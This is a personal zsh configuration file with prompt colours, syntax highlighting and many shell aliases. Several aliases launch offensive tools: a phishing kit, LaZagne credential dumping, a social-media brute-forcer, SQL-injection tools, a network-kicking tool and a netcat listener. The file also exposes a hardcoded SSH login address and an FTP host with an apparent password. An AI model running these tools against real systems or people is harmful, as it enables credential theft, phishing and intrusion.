# .zshrc
#PURE_PROMPT_SYMBOL="
#┌─[wax@Xidy]─[~]
#└──╼ $ "
# configure `time` format
TIMEFMT=$'\nreal\t%E\nuser\t%U\nsys\t%S\ncpu\t%P'
zstyle ':completion:*' '' matcher-list 'm:{a-z}={A-Z}'
zmodload zsh/nearcolor
# optionally define some options
#PURE_CMD_MAX_EXEC_TIME=10
# change the path color
#zstyle :prompt:pure:path color '#30D5C8'
# change the color for both `prompt:success` and `prompt:error`
#zstyle ':prompt:pure:prompt:*' color "#FF6700"
# turn on git stash status
#zstyle :prompt:pure:git:stash show yes
#fpath+=$HOME/.zsh/pure
autoload -U promptinit; promptinit
autoload -U +X compinit && compinit
#prompt pure
setopt autocd  # Change directory by typing it

PROMPT=$'%F{%(#.blue.63)}┌──[%B%F{%(#.red.202)}яoot%F{%(#.blue.39)}@%F{%(#.blue.202)}ᴡɪɴᴅᴏᴡꜱ95%b%F{%(#.blue.63)}]-%F{%(#.blue.63)}<%F{%(#.blue.39)}%c%F{%(#.blue.63)}>\n%F{%(#.blue.63)}└─%B%(#.%F{red}#.%F{39}⪢)%b%F{reset} '
if [[ -d $HOME/.zsh ]]; then 
	if [ -f $HOME/.zsh/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
		ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)
		. $HOME/.zsh/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
		ZSH_HIGHLIGHT_STYLES[default]=fg='#CA3FFF',bold # Default color: Purple
		ZSH_HIGHLIGHT_STYLES[arg0]=fg='#FC5800',bold # Arg 1: Orange
		ZSH_HIGHLIGHT_STYLES[redirection]=fg='#FBFF00',bold # Redirection, eg: echo "FUCK" >> blah.txt: Yellow
		ZSH_HIGHLIGHT_STYLES[assign]=fg='#FC5000',bold # Variables: Dark Orange
		ZSH_HIGHLIGHT_STYLES[path]=fg="#FC0095",bold,italic # Path, e.g: ls Documents: Pink
		ZSH_HIGHLIGHT_STYLES[path_pathseparator]=fg='#26FC00',bold # Path separator, eg: Documents/blah: Green
		ZSH_HIGHLIGHT_STYLES[globbing]=fg='#00FCED',bold # GLobbing, eg: ???: Cyan
		ZSH_HIGHLIGHT_STYLES[history-expansion]=fg='#FF0000',bold # Last command, eg: !!: Red
		ZSH_HIGHLIGHT_STYLES[commandseparator]=fg='#8200FC',bold # Command separator, verticalbar: Purple
		ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=fg='#00FC32',bold # Hyphens: Bright green
		ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=fg="#FC5800",bold # Double hyphens: ORange
		ZSH_HIGHLIGHT_STYLES[single-quoted-argument]=fg="#00FCED",bold # Single quotes: CYan
		ZSH_HIGHLIGHT_STYLES[double-quoted-argument]=fg="#FC0000",bold # Double quotes: Red
		ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]=fg='#FC00B7',bold # Double quoted variable: "${LOL}" pink
		ZSH_HIGHLIGHT_STYLES[bracket-error]=fg='#FC0000',bold # Square brackets error if [ }: Red
		ZSH_HIGHLIGHT_STYLES[bracket-level-1]=fg='#FC5000',bold # Square brackets if [ -lbah ]: Orange
		ZSH_HIGHLIGHT_STYLES[bracket-level-2]=fg='#FC00F8',bold # Square brackets doubled(Inside) if [[ -balh ]]: purple
		ZSH_HIGHLIGHT_STYLES[bracket-level-3]=fg='#89FC00',bold # Square brackets tripled(Inside) if [[[ -blah ]]]: Green
		ZSH_HIGHLIGHT_STYLES[bracket-level-5]=fg='#0000FC',bold # Square brackets five(Inside) if [[[[[ ]]]]]: Blue
	else
		if [[ -f /bin/git ]]; then
			git clone 'https://github.com/zsh-users/zsh-syntax-highlighting' $HOME/.zsh/zsh-syntax-highlighting
		else
			if grep -q "arch" /etc/os-release; then
				sudo pacman -S git
				git clone 'https://github.com/zsh-users/zsh-syntax-highlighting' $HOME/.zsh/zsh-syntax-highlighting
			elif grep -q "bian" /etc/os-release; then
				sudo apt install git
				git clone 'https://github.com/zsh-users/zsh-syntax-highlighting' $HOME/.zsh/zsh-syntax-highlighting
			fi
		fi	
	fi
else
	mkdir $HOME/.zsh 
	source "$(basename $0)"
fi 



if [[ -f ~/.zsh/pacman.sh ]]; then
	~/.zsh/pacman.sh
fi
if [[ -f ~/.zsh/cpufetch.sh ]]; then
	~/.zsh/cpufetch.sh
fi
if [[ -f ~/.zsh/command-not-found.plugin.zsh ]]; then
	. ~/.zsh/command-not-found.plugin.zsh
fi
if [[ -f ~/scripts/bat.sh ]]; then 
	source ~/scripts/bat.sh
fi
if [[ -f $HOME/.zsh/bd.zsh ]]; then
	. $HOME/.zsh/bd.zsh
fi
if [[ -d $HOME/.zsh/zsh-completions ]]; then 
	. $HOME/.zsh/zsh-completions/zsh-completions.plugin.zsh
fi
export PATH=${PATH}:$HOME/.local/bin:


# History configurations
HISTFILE=~/.zsh_history
HISTSIZE=1000
SAVEHIST=2000
setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE
setopt hist_ignore_dups       # ignore duplicated commands history list
setopt hist_ignore_space      # ignore commands that start with space
setopt hist_verify            # show command with history expansion to user before running it
alias history="history 0"

#bash
#source ~/.zsh/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
if ps -p $$ | grep -qi "zsh";
  then
    export shell="zsh"
	export rc=$HOME/.zshrc
	alias n="zsh";
elif ps -p $$ | grep -qi "bash";
  then
    export shell="bash";
	export rc=$HOME/.bashrc
	alias n="bash"
fi

cd () {
  builtin cd "$@" 2>/dev/null && return
  emulate -L zsh
  setopt local_options extended_glob
  local matches
  matches=( (#i)${(P)#}(N/) )
  case $#matches in
    0) # There is no match, even case-insensitively. Try cdpath.
      if ((#cdpath)) &&
         [[ ${(P)#} != (|.|..)/* ]] &&
         matches=( $^cdpath/(#i)${(P)#}(N/) ) &&
         ((#matches==1))
      then
        builtin cd $@[1,-2] $matches[1]
        return
      fi
      # Still nothing. Let cd display the error message.
      builtin cd "$@";;
    1)
      builtin cd $@[1,-2] $matches[1];;
    *)
      print -lr -- "Ambiguous case-insensitive directory match:" $matches >&2
      return 3;;
  esac
}
function colord {
    for i in {1..250}; do printf "\033[38;5;${i}m Fuck ${i}"; done
}
# My exports
export DATE=$(date +%m-%d-%y)
export NOW=$(date +%m-%d-%y--%I:%M)
RESET='\033[0m'
BOLD='\033[01m'
DISABLE='\033[02m'
UNDERLINE='\033[04m'
STRIKE='\033[09m'
INVISIBLE='\033[08m'
DIM='\e[2m'
BLINK='\e[5m'
ITALIC='\e[3m'
SEPERATOR='▶ '
NC='nc="$(tput sgr0)"'
#######################
# Inverted colors
INVERT='\033[07m'
WHITE_RED="$(tput setab 7)"
#######################
YELLOW='\033[38;5;11m'
LIGHT_BLUE="\033[38;5;21m"
CLEAR="\033[0m"
DARK_GRAY="\033[38;5;238m"
LIGHT_GRAY="\033[38;5;247m"
GRAY="\033[38;5;247m"
CYAN="\033[38;5;14m"
GREEN="\033[38;5;2m"
WHITE="\033[38;5;15m"
ORANGE="\033[38;5;202m"
LIGHT_ORANGE="\033[38;5;208m"
DARK_ORANGE="\033[38;5;9m"
RED="\033[38;5;9m"
LIGHT_RED='\033[38;5;9m'
TURQUOISE="\033[38;5;45m"
PURPLE='\033[38;5;164m'
BLUE="\033[38;5;21m"
BLACK="\033[38;5;235m"
PINK="\033[38;5;199m"
BRIGHT_GREEN="\033[38;5;46m"

### BOLD COLORS
BGREY='\033[1;49;37m'
at='\033[1;49;36m'
####
RV_GREEN="\033[48;5;46m"
RV_TURQUOISE="\033[48;5;14m"
RV_RED="\033[48;5;1m"
RV_ORANGE="\033[48;5;214m"
RV_WHITE="\033[48;5;15m"
RV_GREEN2="\033[48;5;82m"
export me=$(whoami)
export term=`basename "$(cat "/proc/$PPID/comm")"`
export alphanumeric='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
#export rc=$HOME/.zshrc
export PATH=$PATH:$HOME/scripts
export stuff="/mnt/c/Users/Gaming PC/Stuff"
export LD_PRELOAD=""
export EDITOR="nano"
export LC_ALL='en_US.utf8'
export DISPLAY=':0.0'
#==>Exports
# LS colors
#export LS_DIR='di=01;38;5;49:'	#Green-ish
export LS_DIR='di=1;49;36:'
export LS_PY=':*.py=01;38;5;21:'
export LS_SH='*.sh=01;1;35:'
export LS_LINK='ln=01;1;4;33:'
export LS_DIFF='*.diff=01;38;5;201:'
export LS_TXT='*.txt=01;38;5;177:'
export LSCOLORS='ow=01;1;34:*.mp4=01;31:*.jpg=01;1;34:*.png=01;1;32:'; 
export LSCOLORS1=$LSCOLORS:'*.zip=01;38;5;177:ex=01;38;5;198:*.url=01;38;5;190:*.lnk=01;38;5;190:';
export LS_COLORS2=$LSCOLORS:$LSCOLORS1:$LS_DIR:$LSPY:$LS_SH:$LS_LINK:
export LS_COLORS3=$LS_DIFF:$LS_COLORS2:
export LS_COLORS=$LS_COLORS3:$LS_TXT:
# GREP COLOR
export GREP_COLOR='1;49;92'
# GCC COLORS
export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
export DISPLAY=localhost:0.0
# My aliases
alias ls="ls --color=always"
alias l="ls"
alias la="ls -A" # Show all files including hidden
alias ldd="ls -d */" # Show directories
alias lf="ls -p | grep -v /" # Show all files in $PWD
alias lfa="ls -Ap | grep -v /" # Show all files, including hidden in $PWD
alias lg="ls | grep -i ${1}" # Search for a file in the $PWD
alias lga="ls -A | grep -i ${@:1}" # Search for a file and include hidden files in the $PWD
alias files='echo -e "There are $(ls | wc -w) files in ${PWD}"' # Count files in the $PWD
alias fix-shebang="sed -i -e 's/\r$//' "
alias stuff="cd '/mnt/c/Users/Gaming PC/Stuff'" # Go to my shit directory
alias b="cd .."	# Move back a directory
alias p="cd -" # Go to the previous directory
alias b='cd .. && pwd'
alias ..='cd ../.. && pwd'
alias ...='cd ../../.. && pwd'
alias ....='cd ../../../.. && pwd'
alias .....='cd ../../../../.. && pwd'
alias admin='perl $HOME/scripts/admin'
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
#alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
alias aliases='sed -n "/^alias/=" /home/wax/.bashrc'
alias anchor='gconftool-2 --type Boolean --set /apps/docky-2/Docky/Items/DockyItem/ShowDockyItem True && killall docky'
alias anchoroff='gconftool-2 --type Boolean --set /apps/docky-2/Docky/Items/DockyItem/ShowDockyItem False && killall docky'
alias aspech='ssh z77k7sdfuwyg@107.180.50.169'
alias atom='/home/wax/scripts/atom-1.58.0-amd64/atom'
alias backuplog='sudo cat /var/log/apache2/access.log >> access.log'
alias bashbang='sed -i "1i#!/bin/bash" ${@:1}'
alias bashrc-cli='nano $HOME/.bashrc'
alias bashrc-gui='geany $HOME/.bashrc'
#alias boot='echo $NOW >> $HOME/Tmp/boot_times.diff && sudo systemd-analyze >> $HOME/Tmp/boot_times.diff'
#alias boot='echo $NOW >> $HOME/Tmp/boot_times.diff && echo "Boot time finished in: $(systemd-analyze | cut -d " " -f16)" >> $HOME/Tmp/boot_times.diff && echo $NOW >> $HOME/Tmp/boot_times.diff && echo $(systemd-analyze) >> $HOME/Tmp/boot_times_Detailed.diff'
alias boottime='notify-send "boot finished in" "$(echo -e "Boot time finished in: $(systemd-analyze | cut -d " " -f16)")" && echo -e "Boot time finished in: $(systemd-analyze | cut -d " " -f16)"'
alias c='clear'
alias cache='sudo pacman -Sc'
alias cheaders="curl --head "
alias checkports='sudo netstat -tlnp'
alias check='proxychains curl -s http://checkip.dyndns.org/ | grep -o [0-9][0-9]*.[0-9][0-9]*.[0-9][0-9]*.[0-9]*'
alias clean='bleachbit -c --preset'
alias code='$HOME/scripts/VSCode-linux-x64/bin/code'
alias colors='python2 $HOME/scripts/colors'
alias commands='cat ~/.commands | more'
alias compress='tar -cvpzf $1.tar.gz $1'
alias conkyc='conky -c '
alias contents='tar -tvf $1'
alias copy='xclip -sel clip'
alias cpr='cp -r '
alias cpu='/home/wax/scripts/cpufetch/cpufetch'
#alias count='find . -type f | wc -l'
alias dd='sudo dd status=progress '
#alias depends=" pacman -Qi | sed '/^Depends On/,/^Required By/{ s/^Required By.*$//; H; d }; /^Name/!d; /^Name/{ n;x;}'| sed '/^$/s//==================================================================================/' | more"
#alias desktop='ssh -X wax@24.31.137.200'
alias detect='python2 $HOME/scripts/D-TECT/d-tect.py'
alias dhcpcd='sudo dhcpcd'
alias dir='dir --color=auto'
alias dirs='ls -d */'
alias disable='sudo systemctl disable '
alias neodistro='$HOME/scripts/sys-info/neofetch/neofetch --ascii_colors 8 8 7 --colors 8 8 8 8 9 8 --ascii_distro '
alias dots="toilet -f smbraille "
alias e='exit'
alias editconky="geany $HOME/.conky/conky/myconky"
alias egrep='egrep -i --color=always'
alias email='$HOME/scripts/thunderbird/thunderbird'
alias enable='sudo systemctl enable '
alias enabled='systemctl list-unit-files --state=enabled' # systemctl list-unit-files |grep enabled
alias etc='python2 $HOME/scripts/data'
alias exe="chmod a+x $1"
alias facebook='python2 $HOME/scripts/facebook'
alias fgrep='fgrep --color=always'
alias fig='python2 /home/wax/scripts/fig.py'
alias find='sudo find '
#alias findmac='cat /sys/class/net/w*/address'
alias font="figlet -f /home/wax/scripts/figlet-fonts/pagga.tlf $@"
alias font1="figlet -f /home/wax/scripts/figlet-fonts/future.tlf $@"
alias font2="figlet -f /home/wax/scripts/figlet-fonts/rustofat.tlf $@"
alias font3="figlet -f /home/wax/scripts/figlet-fonts/emboss.tlf $@"
alias font4="figlet -f /home/wax/scripts/figlet-fonts/emboss2.tlf $@"
alias gh='history|grep --color=always'
alias gigs='du -sh * | grep G'
alias google='python3 $HOME/scripts/googler'
alias gpu='/home/wax/scripts/sys-info/gpufetch/gpufetch' #--color 239,90,45:210,200,200:100,200,45:0,200,200
alias grep='grep -i --color=always'
alias grepit='grep -r "$1" $HOME'
alias h='history'
alias hostcheck='python2 $HOME/scripts/hostcheck'
alias host-only='sudo vboxmanage hostonlyif create'
alias hosts='sudo nano /etc/hosts'
alias inet='ping -c 2 google.com'
alias inject='python2 $HOME/scripts/sql'
alias ip='ip --color=always '
alias k=killall
alias kickthemout='python2 $HOME/scripts/kickthemout/kickthemout.py'
alias krita='$HOME/scripts/krita-4.4.3-x86_64.appimage'
alias la='ls -A'
alias list_groups="sudo cat /etc/group"
alias listen='nc -lnvp $1'
alias lk='ls -ska'
alias lf='ls -p | grep -v /'
alias lfa='ls -Ap | grep -v /'
alias lg="ls -lhAF --color --size -1 -S --classify | grep --color=always $1"
alias lgi='ls -lhAF --color --size -1 -S --classify | grep -i --color=always $1'
alias ll='ls -l'
alias l='ls -F'
#alias ls="lsd --color=always"
alias lsblk='lsblk -o name,size,fsused,fsuse%,model,mountpoint'
alias ls-time="ls -ltra"
alias logout='bash $HOME/scripts/logout'
alias lss='ls -lskhACF --color --human-readable --size -1 -S --classify '
alias mac='python2 $HOME/scripts/mac'
# command 2>&1 | tee file.txt nmap -Pn -A --script vuln
alias mconvert='$HOME/scripts/music_converter.py'
#alias md='retext $1'
alias messaging="cd /home/wax/Etc/android-messages-desktop && npm start"
alias meta='perl $HOME/scripts/metadata/exiftool'
alias mnt='mount | awk -F'\'' '\'' '\''{ printf "%s\t%s\n",$1,$3; }'\'' | column -t | egrep --color=always ^/dev/ | sort' 	#df -hx tmpfs --output=source,target
alias myconky='conky -c $HOME/.conky/conky/myconky &'
alias myconky2="conky -c $HOME/.conky/conky/newconky &"
#alias n='bash'
#alias neo='$HOME/scripts/neofetch/neofetch --ascii_colors 7 8 7 --colors 8 1 8 8 1 7 --ascii_distro arch' #Orange/Grey
alias neo='$HOME/scripts/neofetch/neofetch --ascii_colors 8 8 7 --colors 8 8 8 8 9 8 --ascii_distro arch' #Grey/Grey
alias neofetch='$HOME/scripts/sys-info/neofetch/neofetch'
alias network='sudo iwctl station wlan0 connect WiFiEnterprise3293 && sudo dhcpcd'
alias netstat="sudo netstat -antup"
alias netdiscover='sudo netdiscover'
alias ngrok='/home/wax/scripts/ngrok'
alias nikto='perl $HOME/scripts/nikto/program/nikto.pl -h'
alias nmap='sudo nmap '
alias nmap2='sudo /$HOME/scripts/dracnmap.sh'
alias notepad='$HOME/Etc/turtl-linux64/turtl/turtl'
alias odus='sudo'
alias onion="tor-browser-en"
alias openshot='$HOME/scripts/OpenShot-v2.6.1-x86_64.AppImage'
alias p='cd -'
alias pacman='sudo pacman '
alias paste='xclip -out -selection clipboard;echo'
alias phisher='cd $HOME/scripts/phisherman && sudo python2 $HOME/scripts/phisherman/phisherman.py'
alias pip='python3 $HOME/scripts/get-pip.py '
alias pkgs="pacman -Qi | sed '/^Name/{ s/  *//; s/^.* //; H;N;d}; /^URL/,/^Build Date/d; /^Install Reason/,/^Description/d; /^  */d;x; s/^.*: ... //; s/Jan/01/;  s/Feb/02/;  s/Mar/03/;  s/Apr/04/;  s/May/05/;  s/Jun/06/;  s/Jul/07/;  s/Aug/08/; s/Sep/09/; s/Oct/10/;  s/Nov/11/;  s/Dec/12/; / [1-9]\{1\} /{ s/[[:digit:]]\{1\}/0&/3 }; s/\(^[[:digit:]][[:digit:]]\) \([[:digit:]][[:digit:]]\) \(.*\) \(....\)/\4-\1-\2 \3/' | sed ' /^[[:alnum:]].*$/ N; s/\n/ /; s/\(^[[:graph:]]*\) \(.*$\)/\2 \1/; /^$/d'"
alias portid='fuser $@'
alias ports='perl $HOME/scripts/port.pl'
alias program='cd /home/wax/scripts/Programming'
alias privacy='python2 $HOME/scripts/LaZagne/Linux/laZagne.py all -v'
alias projects='pcmanfm $HOME/Documents/Programming'
alias proxies='python2 $HOME/scripts/proxy.py'
alias ppwd="pwd | sed 's|.*/||'"
alias pwdb='python2 $HOME/scripts/pwdb.py'
alias py2='python2'
alias py3='python3 '
alias pycolors="$HOME/scripts/.pycolorsrc.py"
alias pybang="sed -i '1i#!/bin/python3' $@"
alias py2bang="sed -i '1i#!/bin/python2' $@"
alias python='python2'
alias recent='ls -t1 --color=never | head -n $1'
alias record='$HOME/scripts/vokoscreen'
alias reload-fonts='fc-cache -vf'
alias resources='geany $HOME/Documents/online_resources.conf'
alias rings='conky -c $HOME/.conky/conkyrc_seamod &'
alias router='ip route | grep --color=always default'
alias rootkit='sudo chkrootkit'
#alias scapy3='sudo python3 /bin/scapy'
#alias scapy2='sudo python2 /bin/scapy'
alias scapy="$HOME/scripts/scapy/run_scapy"
alias scripts='cd $HOME/scripts && ls -lskACF'
alias scripts2='cd "/mnt/c/Users/Gaming PC/Stuff/scripts/"'
alias services='systemctl --type=service'
alias shc='/home/wax/scripts/shc/src/shc '
alias shells='cd "/mnt/c/Users/Gaming PC/Stuff/scripts/Shells"'
alias showservices="ls /usr/lib/systemd/system/ | grep service && ls /etc/systemd/system | grep service"
alias showspace='df -lhPx tmpfs'
alias shred='shred -zf'
alias ssize='du -sh * | sort -h'
alias size='du -sh $1'
alias socialbox='sudo $HOME/scripts/SocialBox/SocialBox.sh'
alias spaghetti='python2 $HOME/scripts/Spaghetti/spaghetti.py '
alias speed='$HOME/scripts/speedtest'
alias sqlmap='python3 $HOME/scripts/sqlmap/sqlmap.py'
alias sql='python2 $HOME/scripts/sqli_/sqli'
alias sshcfg='sudo nano /etc/ssh/sshd_config'
alias ssh="/bin/ssh"
alias start='sudo systemctl start '
#alias status='systemctl is-active ${@:1}'
alias status='systemctl status ${@:1}'
alias stop='sudo systemctl stop '
alias storage="cd /run/media/wax/storage/"
alias su='sudo su -l root -s /bin/zsh'
alias tools='sudo pacman -Sg | grep --color=always blackarch '
alias torchrome='chromium --proxy-server="socks5://127.0.0.1:9050" ipaddress.com'
alias tsecserver="cd /run/media/wax/storage/Etc/WEB/MY_WEBSITES/TSecTech && python2 -m SimpleHTTPServer"
alias tt='echo -e "apkr";ftp terrortroll.com'
alias tv='tar -tvf $@'
alias update_youtube='curl -L https://yt-dl.org/downloads/latest/youtube-dl -o $HOME/scripts/youtube-dl'
alias upgrades='$HOME/.bash/upgrades.sh'
alias vdir='vdir --color=auto'
alias waterfox='$HOME/.waterfox/waterfox/waterfox'
alias weather="$HOME/scripts/weather"
alias wget='wget -U '\''noleak'\'''
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
							#######################
							#░█▀█░█░░░▀█▀░█▀█░█▀▀ #
							#░█▀█░█░░░░█░░█▀█░▀▀█ #
							#░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀ #
							#######################
							
# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias dir='dir --color=auto'
    alias vdir='vdir --color=auto'

    alias grep='grep --color=always'
    alias fgrep='fgrep --color=always'
    alias egrep='egrep --color=always'
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f /usr/bin/tor ];then
	alias torchrome='chromium --proxy-server="socks5://127.0.0.1:9050" ipaddress.com'
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
#expac "%n %m" -l'\n' -Q $(pacman -Qq) | sort -rhk 2
if grep -q arch /etc/os-release;
	then
		alias wifi='sudo wifi-menu'
		alias start='sudo systemctl start '
		alias stop='sudo systemctl stop '
		alias enable='sudo systemctl enable '
		alias disable='sudo systemctl disable '
		alias restart='sudo systemctl restart '
		alias status='systemctl is-active ${@:1} '
		alias pacman='sudo pacman --color=always '
		alias pacsearch='pacman -Ss --color=always '
		alias pacman-key="sudo pacman-key "
		
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if grep -q bian /etc/os-release;
	then
		alias start='sudo service $1 start '
		alias stop='sudo service $1 stop '
		alias enable='sudo service $1 enable '
		alias disable='sudo service $1 disable '
		alias restart='sudo service $1 restart '
		alias status='service $1 status '
		alias apt='sudo apt-get install '
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f /usr/bin/bleachbit ]; then
	alias clean='bleachbit -c --preset'
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f /run/media/wax/storage ]; then
	alias hom3="cd /run/media/wax/storage"
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
: '
if [ -f /usr/bin/bat ];then
	alias cat="bat"
#elif [ -f /usr/bin/lolcat ]; then
#	alias cat="lolcat"
else
	alias cat="cat"
fi
'
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d $HOME/Development ]; then
	alias dev="cd $HOME/Development && chmod a+x * && ls -lart"			## && ls -lskACF"
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d $HOME/scripts ];
	then
		alias scripts="cd $HOME/scripts && ls -lart"		#-lskACF"
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f /run/media/wax/storage/scripts/Programming/bash/ascii_art.sh ];
	then
		alias add-art="geany /run/media/wax/storage/scripts/Programming/bash/ascii_art.sh"
		if [ -f /usr/bin/lolcat ];
			then
				alias arch-art="lolcat /run/media/wax/storage/scripts/Programming/bash/ascii_art.sh"
		else
			alias arch-art="cat /run/media/wax/storage/scripts/Programming/bash/ascii_art.sh"
		fi
else
	echo -e ""
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d $HOME/Documents ];
	then
		alias docs="cd ~/Documents"
else
	mkdir ~/Documents
	alias docs="cd ~/Documents"
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d $HOME/Downloads ];
	then
		#alias downloads="cd ~/Downloads"
		alias downloads="cd '/mnt/c/Users/Gaming PC/Stuff/Downloads'"
else
	mkdir ~/Downloads
	#alias downloads="cd ~/Downloads"
	alias downloads="cd '/mnt/c/Users/Gaming PC/Stuff/Downloads'"
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d $HOME/Etc ];
	then
		alias other="cd ~/Etc"
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d $HOME/Multimedia ];
	then
		alias media="cd ~/Multimedia"
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'

: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f $HOME/.commands ]; then
	alias more-commands="more $HOME/.commands"
	alias head-commands="head -n 25 $HOME/.commands"
	alias tail-commands="tail -n 25 $HOME/.commands"
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f $HOME/.memo.txt ]; then
	alias memo="geany $HOME/.memo.txt"
else
	touch $HOME/.memo.txt
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'

: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
: '@@@@@    Git hub aliases    @@@@@'
if [ -d $HOME/Documents/GitHub_Help/Git_Projects ]; then
	alias git_projects="cd $HOME/Documents/GitHub_Help/Git_Projects"
fi
if [ -f /usr/bin/git ]; then
	alias get="git clone --depth 1 "
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'

: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f $HOME/scripts/youtube-dl ]; then
	alias dl='python2 $HOME/scripts/youtube-dl'
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'

if [ -f /usr/bin/mpsyt ]; then
	alias mps="mpsyt"
fi

: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f /usr/bin/jp2a ]; then
	alias ascii="jp2a "
	alias jp="jp2a "
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [[ -d $HOME/Pictures ]]; then
	alias pics="cd $HOME/Pictures"
fi

: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d /run/media/wax/storage/Etc/WEB ]; then
	alias web="cd /run/media/wax/storage/Etc/WEB"
fi

: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d $HOME/scripts/Github_Shit ]; then
	alias gitshit="cd $HOME/scripts/Github_Shit"
else
	alias gitshit="echo -e 'Directory not found'"
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [[ $OS == 'Arch' ]]; then
	alias pkginfo="sudo pacman -Si "
elif [[ $OS == 'Debian' ]]; then
	alias pkginfo="sudo apt-cache show "
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f /usr/bin/mpv ]; then
	alias music='mpv --playlist=/home/wax/Music --shuffle'
fi
